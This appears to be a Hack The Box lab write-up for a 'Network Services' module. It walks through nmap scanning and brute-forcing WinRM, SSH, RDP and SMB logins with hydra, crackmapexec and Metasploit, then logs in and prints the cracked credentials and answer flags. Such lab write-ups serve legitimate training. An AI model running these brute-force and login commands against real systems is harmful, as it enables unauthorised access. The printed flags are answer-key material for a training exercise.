# Network Services

### Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.129.202.136 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 06:13 EST
Nmap scan report for 10.129.202.136 (10.129.202.136)
Host is up (0.27s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 f8:7f:1a:49:37:df:4d:9f:1b:13:c3:9a:bd:de:55:b4 (RSA)
|   256 b9:c9:3a:f1:fc:3b:85:27:09:2a:69:c1:43:0b:97:9b (ECDSA)
|_  256 d1:a8:1a:e9:26:82:4b:a2:48:92:06:f8:ed:13:5d:71 (ED25519)
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  4           2049/tcp   nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINSRV
| Not valid before: 2024-02-17T10:00:52
|_Not valid after:  2024-08-18T10:00:52
| rdp-ntlm-info: 
|   Target_Name: WINSRV
|   NetBIOS_Domain_Name: WINSRV
|   NetBIOS_Computer_Name: WINSRV
|   DNS_Domain_Name: WINSRV
|   DNS_Computer_Name: WINSRV
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-18T11:15:26+00:00
|_ssl-date: 2024-02-18T11:15:35+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-18T11:15:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

lets crack winrm using user list & password list included in this question

```bash
winrm 10.129.6.207 -u username.list -p password.list 
WINRM       10.129.6.207    5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)
```

to login with credentials

```bash
evil-winrm -i 10.129.6.207 -u john -p 'november'
type C:\Users\john\Desktop\flag.txt
HTB{That5Novemb3r}
```

### Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
#crack ssh with hydra
hydra -L username.list -P password.list 10.129.6.207 ssh
[22][ssh] host: 10.129.6.207   login: dennis   password: rockstar
ssh dennis@10.129.6.207
type C:\Users\dennis\Desktop\flag.txt
HTB{Let5R0ck1t}                        
```

### Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
#crack rdp with hydra
hydra -L username.list -P password.list 10.129.6.207 rdp
[3389][rdp] host: 10.129.6.207   login: chris   password: 789456123
```

to connect into rdp

```bash
xfreerdp /v:10.129.6.207 /u:chris /p:'789456123'
HTB{R3m0t3DeskIsw4yT00easy}
```

### Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```bash
#crack smb with metasploit
msfconsole
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.173.208
run
cassie:12345678910
```

we got creds, now to login through smb

Now we can use `CrackMapExec` again to view the available shares and what privileges we have for them.

```bash
crackmapexec smb 10.129.101.97 -u "cassie" -p "12345678910" --shares
SMB         10.129.101.97   445    WINSRV           Share           Permissions     Remark
SMB         10.129.101.97   445    WINSRV           -----           -----------     ------
SMB         10.129.101.97   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.101.97   445    WINSRV           C$                              Default share
SMB         10.129.101.97   445    WINSRV           CASSIE          READ,WRITE      
SMB         10.129.101.97   445    WINSRV           IPC$            READ            Remote IPC
```

To communicate with the server via SMB, we can use, for example, the tool [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). This tool will allow us to view the contents of the shares, upload, or download files if our privileges allow it.

```bash
smbclient -U cassie\\\\10.129.101.97\\CASSIE
get flag.txt
┌──(kali㉿kali)-[~]
└─$ cat flag.txt                                                        
HTB{S4ndM4ndB33} 
```
